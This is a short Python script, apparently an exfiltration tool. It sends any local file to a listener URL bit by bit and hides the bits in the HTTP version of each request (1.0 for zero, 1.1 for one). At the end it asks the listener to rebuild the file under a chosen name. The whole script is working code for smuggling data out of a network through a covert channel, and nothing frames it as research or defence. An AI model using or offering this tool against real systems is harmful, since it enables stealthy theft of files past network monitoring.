import os
import sys
import argparse
import requests
from http.client import HTTPConnection

send_data_path = "/"
generate_file_path = "/newfile"

def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-o', '--outputfile', required=False, default=None, action='store', help='Output file.')
	parser.add_argument('-i', '--inputfile', required=True, default=None, action='store', help='Input file.')
	parser.add_argument('-u', '--url', required=True, default=None, action='store', help='Listener url.')
	return parser


def send_bit(url, val_):
	if val_ == "0":
		HTTPConnection._http_vsn_str = "HTTP/1.0"	
	elif val_ == "1":
		HTTPConnection._http_vsn_str = "HTTP/1.1"	
	else:
		#https://www.youtube.com/watch?v=MOn_ySghN2Y
		print("https://external-preview.redd.it/srBx_swYIknfTRrPf5gqgE6R3qcNXqeK9LIFuEK9rVQ.jpg?auto=webp&s=f9da8f55a1a108f1fe37df92e52a6064f5ffb9b4")
		sys.exit()
	requests.get(url+send_data_path)


def send_byte(url, byte):
	binary_string = "{:08b}".format(int(byte.hex(),16))
	for bit in binary_string:
		send_bit(url, bit)


def send_file(url, file_, outputfile):
	with open(file_, "rb") as f:
		byte = f.read(1)
		send_byte(url, byte)
		while byte != b'':
			byte = f.read(1)
			if byte == b'':
				break
			send_byte(url, byte)


def process_data(url, outputfile):
	requests.get(url+generate_file_path+"?f="+outputfile)


def main():
	args = get_args().parse_args()
	inputfile = args.inputfile
	url = args.url
	outputfile = args.outputfile
	if outputfile is None:
		outputfile = os.path.basename(inputfile)
	send_file(url, inputfile, outputfile)
	process_data(url, outputfile)


if __name__== "__main__":
	main()